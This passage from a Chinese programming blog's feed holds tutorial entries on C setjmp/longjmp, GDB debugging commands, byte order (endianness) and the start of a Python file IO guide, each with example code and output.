class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">[Postgres@yfslcentos71 code]$ cat jmp.c </span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;setjmp.h&gt;</span><br><span class="line"></span><br><span class="line">jmp_buf jb;</span><br><span class="line"></span><br><span class="line">void f1()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;进入f1()\n&quot;);</span><br><span class="line">    //if(0/*正确执行*/)&#123; &#125;</span><br><span class="line">    if(1/*正确执行*/)&#123; </span><br><span class="line">        printf(&quot;F1 正确执行\n&quot;); </span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        printf(&quot;F1 执行错误\n&quot;); </span><br><span class="line">        longjmp(jb,1);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;退出f1()\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void f2()</span><br><span class="line">&#123;</span><br><span class="line">    printf(&quot;进入f2()\n&quot;);</span><br><span class="line">    if(0/*正确执行*/) &#123;  </span><br><span class="line">        printf(&quot;F2 正确执行\n&quot;); </span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        printf(&quot;F2 执行错误\n&quot;); </span><br><span class="line">        longjmp(jb, 2);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;退出f2()\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    int r = setjmp(jb);</span><br><span class="line">    printf(&quot;longjmp 返回值 r = %d\n&quot;, r);</span><br><span class="line">    if(r==0)&#123;</span><br><span class="line">        f1();</span><br><span class="line">        f2();</span><br><span class="line">    &#125;else if(r==1)&#123;</span><br><span class="line">        printf(&quot;else if 1 返回值 r = %d\n&quot;, r);</span><br><span class="line">        printf(&quot;处理错误1\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;else if(r==2)&#123;</span><br><span class="line">        printf(&quot;else if 2 返回值 r = %d\n&quot;, r);</span><br><span class="line">        printf(&quot;处理错误2\n&quot;);</span><br><span class="line">        exit(2);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;所有函数执行完毕, 程序结束\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>输出结果</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[Postgres@yfslcentos71 code]$ ./jmp </span><br><span class="line">longjmp 返回值 r = 0   &lt;==&gt;  初始执行 返回值 为 0;</span><br><span class="line">进入f1()</span><br><span class="line">F1 正确执行</span><br><span class="line">退出f1()</span><br><span class="line">进入f2()               </span><br><span class="line">F2 执行错误            &lt;==&gt;  longjmp 跳转;</span><br><span class="line">longjmp 返回值 r = 2   &lt;==&gt;  重新返回 setjmp 处，其r值即为longjmp的第二参数;</span><br><span class="line">else if 2 返回值 r = 2 &lt;==&gt;  执行 else if 语句</span><br><span class="line">处理错误2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>GDB 调试</title>
      <link href="/2018/02/20/rebuild/GDB-%E8%B0%83%E8%AF%95/"/>
      <url>/2018/02/20/rebuild/GDB-%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h3 id="GDB-调试篇"><a href="#GDB-调试篇" class="headerlink" title="GDB 调试篇"></a>GDB 调试篇</h3><h4 id="运行命令"><a href="#运行命令" class="headerlink" title="运行命令"></a>运行命令</h4><ul><li>run：简记为 r ，其作用是运行程序，当遇到断点后，程序会在断点处停止运行，等待用户输入下一步的命令。</li><li>continue （简写c ）：继续执行，到下一个断点处（或运行结束）</li><li>next：（简写 n），单步跟踪程序，当遇到函数调用时，也不进入此函数体；此命令同 step 的主要区别是，step 遇到用户自定义的函数，将步进到函数中去运行，而 next 则直接调用函数，不会进入到函数体内。</li><li>step （简写s）：单步调试如果有函数调用，则进入函数；与命令n不同，n是不进入调用的函数的</li><li>until：当你厌倦了在一个循环体内单步跟踪时，这个命令可以运行程序直到退出循环体。</li><li>until+行号： 运行至某行，不仅仅用来跳出循环</li><li>finish： 运行程序，直到当前函数完成返回，并打印函数返回时的堆栈地址和返回值及参数值等信息。</li><li>call 函数(参数)：调用程序中可见的函数，并传递“参数”，如：call gdb_test(55)</li><li>quit：简记为 q ，退出gdb</li></ul><p><br><br><a id="more"></a></p><h4 id="设置断点"><a href="#设置断点" class="headerlink" title="设置断点"></a>设置断点</h4><ul><li><p>break n （简写b n）:在第n行处设置断点</p><p>（可以带上代码路径和代码名称： b OAGUPDATE.cpp:578）</p></li><li><p>b fn1 if a＞b：条件断点设置</p></li><li><p>break func（break缩写为b）：在函数func()的入口处设置断点，如：break cb_button</p></li><li><p>delete 断点号n：删除第n个断点</p></li><li><p>disable 断点号n：暂停第n个断点</p></li><li><p>enable 断点号n：开启第n个断点</p></li><li><p>clear 行号n：清除第n行的断点</p></li><li><p>info b （info breakpoints） ：显示当前程序的断点设置情况</p></li><li><p>delete breakpoints：清除所有断点：</p></li></ul><h4 id="查看源代码"><a href="#查看源代码" class="headerlink" title="查看源代码"></a>查看源代码</h4><ul><li>list ：简记为 l ，其作用就是列出程序的源代码，默认每次显示10行。</li><li>list 行号：将显示当前文件以“行号”为中心的前后10行代码，如：list 12</li><li>list 函数名：将显示“函数名”所在函数的源代码，如：list main</li><li>list ：不带参数，将接着上一次 list 命令的，输出下边的内容。</li></ul><h4 id="打印表达式"><a href="#打印表达式" class="headerlink" title="打印表达式"></a>打印表达式</h4><ul><li>print 表达式：简记为 p ，其中“表达式”可以是任何当前正在被测试程序的有效表达式，比如当前正在调试C语言的程序，那么“表达式”可以是任何C语言的有效表达式，包括数字，变量甚至是函数调用。</li><li>print a：将显示整数 a 的值</li><li>print ++a：将把 a 中的值加1,并显示出来</li><li>print name：将显示字符串 name 的值</li><li>print gdb_test(22)：将以整数22作为参数调用 gdb_test() 函数</li><li>print gdb_test(a)：将以变量 a 作为参数调用 gdb_test() 函数</li><li>display 表达式：在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值。如： display a</li><li>watch 表达式：设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a</li><li>whatis ：查询变量或函数</li><li>info function： 查询函数</li><li>扩展info locals： 显示当前堆栈页的所有变量</li></ul><h4 id="查询运行信息"><a href="#查询运行信息" class="headerlink" title="查询运行信息"></a>查询运行信息</h4><ul><li>where/bt ：当前运行的堆栈列表；</li><li>bt backtrace 显示当前调用堆栈</li><li>up/down 改变堆栈显示的深度</li><li>set args 参数:指定运行时的参数</li><li>show args：查看设置好的参数</li><li>info program： 来查看程序的是否在运行，进程号，被暂停的原因。</li></ul><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><h4 id="调试问题"><a href="#调试问题" class="headerlink" title="调试问题"></a>调试问题</h4><ol><li>字符串显示不全</li></ol><blockquote><p>  (gdb) p recvbuf<br>  ​         $1 = 0x7ffff2692eb0 “{\n    \”errcode\”: 0,\n    \”errlevel\”: 68,\n    \”errmsg\”: \”i`m   ip:192.168.2.253\”,\n    \”filename\”: \”main.cpp\”,\n    \”happenddata\”: \”(2017-08-18 15:36:49 周五)\”,\n    \”isbehave\”: 0,\n    \”ishardware\”: 0,\n “…</p></blockquote><p>GDB 默认显示 200 的字符长度;</p><pre><code>(gdb) show print elements  Limit on string chars or array elements to print is 200.</code></pre><p>使用set print elements [] 调整参数</p><pre><code>set print elements 0  调整set print elements 300</code></pre><ol><li><p>GDB 调试程序,找不到源码,list无效</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">show directories    ## 查看当前GDB寻找源码路径</span><br><span class="line">dir  dirname        ## 添加一个新的源代码查找路径; 多个用 : 分开</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>查看源代码信息: </p><ol><li><p>文件名, 路径, Source language等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">info source</span><br></pre></td></tr></table></figure></li><li><p>查看当前栈 bt (backtrace)/ f (frame)</p><ol><li>f:  打印栈的层编号, 当前函数名， 函数参数值,  所在文件, 行号, 执行语句等</li><li>up:  表示向栈的上面移动n层,  默认 1</li><li>down: 标识向栈的下面移动n层, 默认 1</li></ol></li><li><p>info args    打印当前函数的参数名以及值</p></li><li><p>info locals  打印当前函数中所有局部变量以及值</p></li><li><p>info catch   打印当前的函数中异常处理信息</p></li><li><p>list :</p><pre><code>list + 显示往后代码list - 显示之前代码set listsize 设置一次显示源代码行数show listsize 显示当前listsize 设置</code></pre></li><li><p>搜索源代码 : 可以使用正则表达式</p><pre><code>forward-search / search 向前搜索reverse-search  全部搜索</code></pre></li><li><p>输出格式:</p><pre><code>x 按十六进制格式显示变量d 按十进制格式显示变量u 按十六进制格式显示无符号整型o 按八进制格式显示变量t 按二进制格式显示变量a 按十六进制格式显示变量c 按字符格式显示变量f 按浮点数格式显示变量</code></pre> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p  i</span><br><span class="line">$21 = 101</span><br><span class="line">(gdb) p/a i</span><br><span class="line">$22 = 0x65</span><br></pre></td></tr></table></figure></li></ol></li></ol><h4 id="查看结构体类型-ptype"><a href="#查看结构体类型-ptype" class="headerlink" title="查看结构体类型 ptype"></a>查看结构体类型 <code>ptype</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ptype List</span><br><span class="line">type = struct List &#123;</span><br><span class="line">    NodeTag type;</span><br><span class="line">    int length;</span><br><span class="line">    ListCell *head;</span><br><span class="line">    ListCell *tail;</span><br></pre></td></tr></table></figure><h4 id="改变程序执行"><a href="#改变程序执行" class="headerlink" title="改变程序执行"></a>改变程序执行</h4><pre><code>print x=4whatis width  // 查看数据类型 set width=47  // 修改值;</code></pre><h4 id="jump-跳转执行"><a href="#jump-跳转执行" class="headerlink" title="jump 跳转执行"></a>jump 跳转执行</h4><blockquote><p>jump 提供乱序执行的功能。  GDB可以修改程序的执行顺序,让程序执行随意的跳转;</p></blockquote><p>jump 指定下一条语句的运行点， 可以是文件的行号， 可以使file:line 格式， 可以使+num 偏移量格式,表示着下一条运行语句从哪开始</p><p>jump 代码行的运行地址:</p><p>​    jump 命令不会改变当前程序栈的内容，所以，当你从一个函数跳到另一个函数时，函数运行完返回时进行弹栈操作时必然会发生错误，可能结果非常奇怪， 甚至产生Core dump文件， 所以最好在同一个函数中跳转;</p><p>jump 修改寄存器地址, set $pc</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set $pc = 0x485</span><br></pre></td></tr></table></figure><h4 id="产生信号量"><a href="#产生信号量" class="headerlink" title="产生信号量"></a>产生信号量</h4><pre><code>使用signal命令，可以产生一个信号量给被调试的程序。如: 中断信号Ctrl + C , 这非常方便程序的调试， 可以在程序运行的任意位置设置断点，并在该断点用GDB产生一个信号量，精确在某处产生信号非常有利于调试。    语法：    signal, Unix 的系统信号量通常从1到15，所以取值也在这个范围。    signal 命令和shell的kill不同，系统的kill命令发送信号给被调试程序时，是有GDB截获，而signal命令所发出一信号则是直接发给被调试程序的。</code></pre><h4 id="强制函数返回"><a href="#强制函数返回" class="headerlink" title="强制函数返回"></a>强制函数返回</h4><pre><code>如果你的调试断点在某个函数中，并还有语句没有执行完， 你可以使用return命令强制函数忽略还没有执行的语句并返回。return    使用return命令取消当前函数的执行，并立即返回，如果指定了，那么该表达式的值会被认作函数的返回值</code></pre><h4 id="设置临时变量-set-var"><a href="#设置临时变量-set-var" class="headerlink" title="设置临时变量 set var"></a>设置临时变量 <code>set var</code></h4><p><strong>示例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a = <span class="number">0</span>;</span><br><span class="line">    a = func();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>技巧</strong></p><ol><li><p>在gdb中，可以用“set var variable=expr”命令设置变量的值，以上面代码为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint <span class="number">2</span>, func () at a.c:<span class="number">5</span></span><br><span class="line"><span class="number">5</span>                   <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">(gdb) n</span><br><span class="line"><span class="number">7</span>                   <span class="keyword">return</span> i;</span><br><span class="line">(gdb) <span class="built_in">set</span> var i = <span class="number">8</span></span><br><span class="line">(gdb) p i</span><br><span class="line">$<span class="number">4</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure><p>可以看到在func函数里用set命令把i的值修改成为8。</p></li><li><p>也可以用“set {type}address=expr”的方式，含义是给存储地址在address，变量类型为type的变量赋值，仍以上面代码为例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint <span class="number">2</span>, func () at a.c:<span class="number">5</span></span><br><span class="line"><span class="number">5</span>                   <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">(gdb) n</span><br><span class="line"><span class="number">7</span>                   <span class="keyword">return</span> i;</span><br><span class="line">(gdb) p &amp;i</span><br><span class="line">$<span class="number">5</span> = (<span class="keyword">int</span> *) <span class="number">0x8047a54</span></span><br><span class="line">(gdb) <span class="built_in">set</span> &#123;<span class="keyword">int</span>&#125;<span class="number">0x8047a54</span> = <span class="number">8</span></span><br><span class="line">(gdb) p i</span><br><span class="line">$<span class="number">6</span> = <span class="number">8</span></span><br></pre></td></tr></table></figure><p>可以看到i的值被修改成为8。</p></li><li><p>另外寄存器也可以作为变量，因此同样可以修改寄存器的值: </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Breakpoint <span class="number">2</span>, func () at a.c:<span class="number">5</span></span><br><span class="line"><span class="number">5</span>                   <span class="keyword">int</span> i = <span class="number">2</span>;</span><br><span class="line">(gdb)</span><br><span class="line">(gdb) n</span><br><span class="line"><span class="number">7</span>                   <span class="keyword">return</span> i;</span><br><span class="line">(gdb)</span><br><span class="line"><span class="number">8</span>               &#125;</span><br><span class="line">(gdb) <span class="built_in">set</span> var $eax = <span class="number">8</span>   ;; 修改寄存器地址;</span><br><span class="line">(gdb) n</span><br><span class="line">main () at a.c:<span class="number">15</span></span><br><span class="line"><span class="number">15</span>                  <span class="built_in">printf</span>(<span class="string">"%d\n"</span>, a);</span><br><span class="line">(gdb)</span><br><span class="line"><span class="number">8</span></span><br><span class="line"><span class="number">16</span>                  <span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>可以看到因为eax寄存器存储着函数的返回值，所以当把eax寄存器的值改为8后，函数的返回值也变成了8。</p></li></ol><h4 id="强制调用函数"><a href="#强制调用函数" class="headerlink" title="强制调用函数"></a>强制调用函数</h4><pre><code>call    表达式中可以是函数， 以此达到强制调用函数的目的， 并显示函数的返回值，如果函数返回值是void，那么就不显示。另一个相似的命令也可以完成这一功能 -- print， print 后边可以跟表达式，所以也可以用它来调用函数，     print 和 call 的不同是， 如果函数返回void, call 则不显示， print则显示函数的返回值，并把该值存入历史数据中.</code></pre><h4 id="GDB-调试子进程-follow-fork-mode"><a href="#GDB-调试子进程-follow-fork-mode" class="headerlink" title="GDB 调试子进程 follow-fork-mode"></a>GDB 调试子进程 <code>follow-fork-mode</code></h4><ul><li><p><code>follow-fork-mode</code> 用法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set follow-fork-mode [parent|child]</span><br></pre></td></tr></table></figure><ul><li>parent: fork之后继续调试父进程，子进程不受影响。 </li><li>child: fork之后调试子进程，父进程不受影响。</li></ul><p>因此如果需要调试子进程，在启动gdb后：<br><code>(gdb) set follow-fork-mode child</code></p></li></ul><h5 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h5><p><img src="/img/software/gdb/gdb_fllow_fork_mode_01.png" alt="子进程代码"></p><p><img src="/img/software/gdb/gdb_fllow_fork_mode_02.png" alt="GDB 调试"></p><h4 id="GDB-同时调试父子进程"><a href="#GDB-同时调试父子进程" class="headerlink" title="GDB 同时调试父子进程"></a>GDB 同时调试父子进程</h4><ul><li><code>detach-on-fork</code>参数，指示GDB在fork之后是否断开（detach）某个进程的调试，或者都交由GDB控制：</li></ul><p><code>set detach-on-fork [on|off]</code></p><ul><li>on: 断开调试follow-fork-mode指定的进程。<strong>GDB 默认参数</strong></li><li>off: gdb将控制父进程和子进程。follow-fork-mode指定的进程将被调试，另一个进程置于暂停（suspended）状态。</li></ul><p>注意，最好使用GDB 6.6或以上版本，如果你使用的是GDB6.4，就只有follow-fork-mode模式。</p><p><img src="/img/software/gdb/gdb_detach_on_fork_01.png" alt=""><br><img src="/img/software/gdb/gdb_detach_on_fork_02.png" alt=""></p><h3 id="命令与参数"><a href="#命令与参数" class="headerlink" title="命令与参数"></a>命令与参数</h3><h4 id="查看结构体类型-ptype-1"><a href="#查看结构体类型-ptype-1" class="headerlink" title="查看结构体类型 ptype"></a>查看结构体类型 <code>ptype</code></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(gdb) ptype List</span><br><span class="line">type = struct List &#123;</span><br><span class="line">    NodeTag type;</span><br><span class="line">    int length;</span><br><span class="line">    ListCell *head;</span><br><span class="line">    ListCell *tail;</span><br></pre></td></tr></table></figure><h4 id="调试宏定义-g-level"><a href="#调试宏定义-g-level" class="headerlink" title="调试宏定义 -g[level]"></a>调试宏定义 <code>-g[level]</code></h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Request debugging information and also use level to specify how much information.  The default level is <span class="number">2</span>.</span><br><span class="line">Level <span class="number">0</span> produces no debug information at all.  Thus, -g0 negates -g.</span><br><span class="line">Level <span class="number">1</span> produces minimal information, enough <span class="keyword">for</span> making backtraces <span class="keyword">in</span> parts of the program that you don<span class="string">'t plan to debug.  This includes descriptions of</span></span><br><span class="line"><span class="string">functions and external variables, but no information about local variables and no line numbers.</span></span><br><span class="line"><span class="string">Level 3 includes extra information, such as all the macro definitions present in the program.  Some debuggers support macro expansion when you use -g3.</span></span><br><span class="line"><span class="string">-gdwarf-2 does not accept a concatenated debug level, because GCC used to support an option -gdwarf that meant to generate debug information in version</span></span><br><span class="line"><span class="string">1 of the DWARF format (which is very different from version 2), and it would have been too confusing.  That debug format is long obsolete, but the</span></span><br><span class="line"><span class="string">option cannot be changed now.  Instead use an additional -glevel option to change the debug level for DWARF.</span></span><br></pre></td></tr></table></figure><h4 id="配置文件-gdbinit"><a href="#配置文件-gdbinit" class="headerlink" title="配置文件 ~/.gdbinit"></a>配置文件 <code>~/.gdbinit</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">set startup-with-shell off</span><br><span class="line"></span><br><span class="line">set listsize 30</span><br><span class="line"></span><br><span class="line">#缩进 显示结构体成员</span><br><span class="line">set print pretty on</span><br><span class="line"></span><br><span class="line">#保存历史命令</span><br><span class="line">set history filename ~/.gdb_history</span><br><span class="line">set history save on</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#gdb 过程记录</span><br><span class="line">#set logging file log.txt</span><br><span class="line">set logging on</span><br><span class="line"></span><br><span class="line">#是否让输出覆盖之前的日志文件</span><br><span class="line">#set logging overwrite on</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> GDB </tag>
            
            <tag> 调试 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>理解字节序</title>
      <link href="/2018/01/31/cpluscplus/%E7%90%86%E8%A7%A3%E5%AD%97%E8%8A%82%E5%BA%8F/"/>
      <url>/2018/01/31/cpluscplus/%E7%90%86%E8%A7%A3%E5%AD%97%E8%8A%82%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<ul><li>端的起源</li><li>测试</li></ul><a id="more"></a><p><br></p><h3 id="端的起源"><a href="#端的起源" class="headerlink" title="端的起源"></a>端的起源</h3><blockquote><p>​    Lilliput和Blefuscu这两大强国在过去36个月里一直在苦战。战争开始是由于以下的原因：我们大家都认为，吃鸡蛋前，原始的方法是打破鸡蛋较大的一端，可是当今皇帝的祖父小时候吃鸡蛋，一次按古法打鸡蛋时碰巧将一个手指弄破了。因此他的父亲，当时的皇帝，就下了一道敕令，命令全体臣民吃鸡蛋时打破鸡蛋较小的一端，违令者重罚。老百姓们对这项命令极其反感。历史告诉我们，由此曾经发生过6次叛乱，其中一个皇帝送了命，另一个丢了王位。这些叛乱大多都是由Blefuscu的国王大臣们煽动起来的。叛乱平息后，流亡的人总是逃到那个帝国去寻求避难。据估计，先后几次有11000人情愿受死也不肯去打破鸡蛋较小的一端。关于这一争端，曾出版过几百本大部著作，不过大端派的书一直是受禁的，法律也规定该派任何人不得做官。”</p></blockquote><p><strong>字节顺序</strong>，又称<strong>端序</strong>或<strong>尾序</strong>（英语：<strong>Endianness</strong>）。在计算机科学领域中，是跨越多字节的程序对象的存储规则。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">大端字节序：高位字节在前，低位字节在后； 高字节数据存放于内存低地址处。</span><br><span class="line">小端字节序：低位字节在前，高位字节在后； 低字节数据存放在内存低地址处。</span><br></pre></td></tr></table></figure><p><img src="/img/cplusplus/Big_Edian.jpg" alt=""></p><p>因此<code>0x01020304</code> 在按照大端小端排序写法如下:</p><p>​    低地址    ——-&gt;    高地址</p><p>大端:</p><p>​    <code>0x01</code>  <code>0x02</code>  <code>0x03</code> <code>0x04</code></p><p>小端:</p><p>​    <code>0x04</code>  <code>0x03</code>  <code>0x02</code>  <code>0x01</code></p><h3 id="为什么有字节序"><a href="#为什么有字节序" class="headerlink" title="为什么有字节序?"></a>为什么有字节序?</h3><p>计算机电路先处理低位字节，效率比较高，因为计算都是从低位开始， 因此计算机内部处理使小端字节序。</p><p>但是人类习惯读写大端字节序，除了计算机内部处理， 其他场合都是大端字节序，比如网络传输，文件存储。</p><h3 id="测试用例"><a href="#测试用例" class="headerlink" title="测试用例"></a>测试用例</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">union</span> ion&#123;</span><br><span class="line"><span class="keyword">int</span>  a;</span><br><span class="line"><span class="keyword">char</span> b[<span class="number">4</span>];</span><br><span class="line">&#125;pos;</span><br><span class="line"></span><br><span class="line">pos.a = <span class="number">0x01020304</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(pos.b[<span class="number">0</span>] == <span class="number">0x01</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"大端\n"</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"小端\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python-IO编程</title>
      <link href="/2018/01/27/gram/Python-IO%E7%BC%96%E7%A8%8B/"/>
      <url>/2018/01/27/gram/Python-IO%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>读文件<ul><li>二进制文件</li><li>字符编码</li></ul></li><li>写文件</li><li>Json</li><li>StringIO</li><li>BytesIO</li><li>序列化</li></ul><a id="more"></a><p><br></p><h4 id="读文件"><a href="#读文件" class="headerlink" title="读文件"></a>读文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; f = open(&apos;/Users/michael/test.txt&apos;, &apos;r&apos;)</span><br></pre></td></tr></table></figure><p>由于文件读写时都有可能产生<code>IOError</code>，一旦出错，后面的<code>f.close()</code>就不会调用。所以，为了保证无论是否出错都能正确地关闭文件，我们可以使用<code>try ... finally</code>来实现：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">try:</span><br><span class="line">    f = open(&apos;/path/to/file&apos;, &apos;r&apos;)</span><br><span class="line">    print(f.read())</span><br><span class="line">finally:</span><br><span class="line">    if f:</span><br><span class="line">        f.close()</span><br></pre></td></tr></table></figure><p>但是每次都这么写实在太繁琐，所以，Python引入了<code>with</code>语句来自动帮我们调用<code>close()</code>方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&apos;/path/to/file&apos;, &apos;r&apos;) as f:</span><br><span class="line">    print(f.read())</span><br></pre></td></tr></table></figure><p>这和前面的<code>try ... finally</code>是一样的，但是代码更佳简洁，并且不必调用<code>f.close()</code>方法。</p><p><br></p><h5 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h5><p>前面讲的默认都是读取文本文件，并且是UTF-8编码的文本文件。要读取二进制文件，比如图片、视频等等，用<code>&#39;rb&#39;</code>模式打开文件即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 